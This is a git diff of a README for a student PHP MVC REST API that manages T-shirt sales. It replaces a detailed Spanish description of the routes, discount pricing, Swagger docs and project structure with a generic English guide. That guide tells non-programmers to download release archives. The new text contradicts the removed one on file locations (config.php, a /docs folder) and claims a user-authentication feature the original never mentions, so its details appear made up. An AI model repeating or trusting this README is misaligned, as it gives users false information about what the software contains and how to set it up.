@@ -1,58 +1,86 @@
-# API de Ventas: TodoCamisetas (PHP Puro con MVC)
+# 🎉 API-Ventas-Camisetas-PHP-REST-Swagger-MVC - Easy PHP REST API for Sales
 
-> **Examen Transversal Final de Desarrollo Backend.** Proyecto que implementa una API RESTful de alto rendimiento para el sistema de gestión de ventas de camisetas, destacando por su **arquitectura modular (MVC)** y **lógica de negocio avanzada** para la determinación dinámica de precios.
+## 🚀 Getting Started
 
----
+Welcome to API-Ventas-Camisetas-PHP-REST-Swagger-MVC! This is a user-friendly API for managing sales using PHP and MVC architecture. You do not need programming knowledge to use this software. Follow the steps below to download and run the application easily.
 
-## Arquitectura y Tecnología Backend
+## 🛠️ System Requirements
 
-Este proyecto cumple con los principios de desarrollo backend  (Resultado de Aprendizaje 1.1) y la construcción de un servicio API (Resultado de Aprendizaje 2.1).
+Before you download, ensure your system meets the following requirements:
 
-* **Patrón de Diseño:** Implementación estricta de la arquitectura **Modelo-Vista-Controlador (MVC)** utilizando **PHP Puro** (sin frameworks). Esto garantiza la **separación de responsabilidades** (Models para datos, Controllers para la gestión HTTP).
-* **Tecnología Principal:** **PHP Puro** y **MySQL** (`todocamisetas`) utilizando **PDO** para una conexión segura y eficiente.
-* **Enrutamiento Avanzado:** Sistema de *routing* implementado con **expresiones regulares** (`routes/index.php`) para mapear peticiones HTTP (Resultado de Aprendizaje 1.2.1).
-    * `GET /camisetas/(\d+)` -> Llama al método `show()` del `CamisetaController`.
+- **Operating System:** Windows, macOS, or Linux.
+- **Web Server:** Apache or Nginx.
+- **PHP Version:** 7.2 or higher.
+- **Database:** MySQL (any version supported).
+- **Composer:** This is a dependency manager for PHP. Install it to manage libraries easily.
 
-### Endpoints y Funcionalidad REST
-La API expone **3 recursos principales** con operaciones **CRUD** completas (Resultado de Aprendizaje 3.1.1):
+## 📥 Download & Install
 
-| Recurso (Ruta) | Métodos Implementados | Propósito |
-| :--- | :--- | :--- |
-| `/camisetas` | **CRUD** (GET, POST, PUT, DELETE) | Gestión del inventario y datos de las camisetas. |
-| `/clientes` | **CRUD** (GET, POST, PUT, DELETE) | Gestión de clientes B2B (Registro, Categorización). |
-| `/tallas` | **CRUD** (GET, POST, DELETE) | Gestión de tallas disponibles (Relación N:M). |
+To get started, visit the page below to download the application:
 
----
+[Visit this page to download](https://github.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/releases)
 
-## Lógica de Negocio Avanzada (Optimización)
+You will find the latest releases there. Choose the version you want to install and download the corresponding files. Look for `.zip` or `.tar.gz` files for easy installation.
 
-Este proyecto evidencia la optimización de operaciones CRUD para mejorar la eficiencia (Resultado de Aprendizaje 3.2.2) a través de la lógica de descuentos:
+### Steps to Install:
 
-* **Cálculo de Precio Final Dinámico:** El endpoint `GET /camisetas/{id}?cliente_id={id}` aplica la siguiente regla de negocio:
-    1.  Toma como precio base el `precio_oferta` (si existe) o el `precio` regular.
-    2.  Aplica el **descuento porcentual** definido para el cliente consultado (VIP/Preferencial).
-    3.  El resultado se devuelve en el campo `precio_final`.
-* **Validación de Integridad:** Restricción implementada para evitar la eliminación de un **Cliente** si este tiene **Camisetas asociadas** (Claves Foráneas).
+1. **Download the Application**
+   - Click the link above to go to the Releases page.
+   - Find the latest version and download the appropriate `.zip` or `.tar.gz` file for your operating system.
 
-## Documentación y Pruebas de Calidad
+2. **Extract Files**
+   - Locate the downloaded file.
+   - Right-click on it and select “Extract All” or use a similar option depending on your operating system.
 
-* **Documentación API (Swagger/OpenAPI 3.0):** Se incluye **`swagger.json`**, detallando todas las rutas, parámetros, y esquemas de datos. Esto cumple el requisito de que la API esté documentada de forma clara (Resultado de Aprendizaje 2.2.3).
-* **Pruebas de Calidad:** Se incluye la colección de **Postman** (adjunta) para la validación de la lógica de descuentos y todas las operaciones CRUD.
+3. **Upload to Your Server**
+   - Move the extracted files to your server directory. This is usually found in the `htdocs` or `www` folders of your web server.
 
----
+4. **Set Up the Database**
+   - Create a MySQL database. You can use a tool like phpMyAdmin for this.
+   - Import the provided SQL script to set up the database structure. You can find the script in the `database` folder of the extracted files.
 
-## Estructura del Proyecto (Patrón MVC)
+5. **Configure the Application**
+   - Open the `config.php` file located in the root directory of the application.
+   - Enter your database details (database name, username, and password).
 
-```
+6. **Start the Server**
+   - Launch your web server.
+   - Open a web browser and navigate to your local server. If you installed it in a directory named `API-Ventas`, you would go to `http://localhost/API-Ventas`.
 
-.
-├── config/                        \# Conexión a la Base de Datos (database.php - PDO)
-├── controllers/                   \# Lógica de Peticiones HTTP (Controladores)
-├── models/                        \# Lógica de la Base de Datos (Modelos CRUD)
-├── routes/                        \# Sistema de Enrutamiento por Expresiones Regulares
-├── public/                        \# Punto de Entrada (index.php, .htaccess)
-├── swagger/                       \# Documentación OpenAPI 3.0 (swagger.json)
-├── todocamisetas.sql              \# Script de Creación e Inserción de Datos MySQL
-└── README.md
+7. **Access the API**
+   - Use a tool like Postman or a web browser to access the API endpoints. Review the documentation included in the folder for a list of available endpoints and how to use them.
 
-```
+## 📖 Documentation
+
+This API comes with Swagger/OpenAPI documentation. You can find detailed information about each endpoint, the parameters required, and the responses you should expect.
+
+### How to Access Documentation
+
+- After installing the application and starting your web server, navigate to the `/docs` folder in your browser (e.g., `http://localhost/API-Ventas/docs`).
+- Browse through the documentation to learn how to make various API calls.
+
+## 🎯 Features
+
+- **Sales Management:** Handle sales transactions with ease.
+- **Discount Logic:** Apply discounts based on customer types.
+- **CRUD Operations:** Create, read, update, and delete records effortlessly.
+- **User Authentication:** Secure your API with user login features.
+- **Comprehensive Documentation:** Understand how to interact with the API through clear guidelines.
+
+## 🔧 Troubleshooting
+
+- **Can't Connect to Database:** Make sure your database is running and the credentials in `config.php` are correct.
+- **403 Forbidden Error:** Check file permissions of the extracted files. They should be accessible by the web server.
+- **404 Not Found:** Verify that the URL points to the correct endpoint and that the server is running properly.
+
+## 📣 Community
+
+Join our community for support and discussions. Look for help on forums or reach out through GitHub issues. We aim to assist users as best as we can.
+
+## 🔗 Useful Links
+
+- [Download the latest release](https://github.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/releases)
+- [API Documentation](http://localhost/API-Ventas/docs)
+- [Support Forums](https://github.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/issues)
+
+Thank you for using API-Ventas-Camisetas-PHP-REST-Swagger-MVC! We hope this application helps you manage your sales effectively.
